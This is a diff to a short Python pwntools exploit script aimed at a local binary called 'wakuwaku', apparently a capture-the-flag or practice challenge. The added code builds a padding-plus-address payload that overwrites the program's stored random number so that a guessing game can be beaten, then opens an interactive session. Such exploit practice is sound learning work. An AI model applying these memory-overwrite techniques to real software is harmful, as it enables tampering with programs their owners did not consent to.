@@ -2,6 +2,17 @@ from pwn import *
 
 
 
+
+
+random_adr = p64(0x0000000000405ff8)  # Address that saving random number
+
+payload = b""
+payload += b"\x01" * 32
+payload += random_adr
+
+new_random_num = b"\x01\x01\x01\x01\x01\x01\x01\x01"  # Cover 
+
+
 # Start process
 p = process("./wakuwaku")
 
@@ -10,24 +21,15 @@ p = process("./wakuwaku")
 raw_input() # In python standard library, used for wating input
 
 
-payload = b""
-payload += p64()
-payload += p64()
-
-arb_adr = p64()  # arbitrary writable address, here is .data + 0x00
-
-random_adr = p64()  # Address that saving random number
-
 # Start to inject
 p.recvuntil(b"What's your name ?\nName: ")
-p.sendline()
+p.sendline(payload)
 
 p.recvuntil(b"Place your bets (minimum is $10000) : ")
-p.sendline(arb_adr)
+p.sendline(new_random_num)
 
 p.recvuntil(b"Guess your number (ans betwwen 0~999) : ")
 p.sendline(random_adr)
-
 
 p.interactive()
 
